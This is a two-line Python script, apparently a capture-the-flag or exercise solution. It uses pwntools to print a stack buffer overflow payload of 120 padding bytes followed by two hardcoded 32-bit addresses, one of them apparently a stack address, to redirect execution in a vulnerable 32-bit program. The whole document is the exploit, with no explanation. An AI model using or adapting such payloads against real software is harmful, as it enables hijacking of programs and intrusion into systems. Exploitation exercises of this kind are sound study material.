from pwn import *
print "A"*120 + p32(0x0804852b)+p32(0xffffd434)
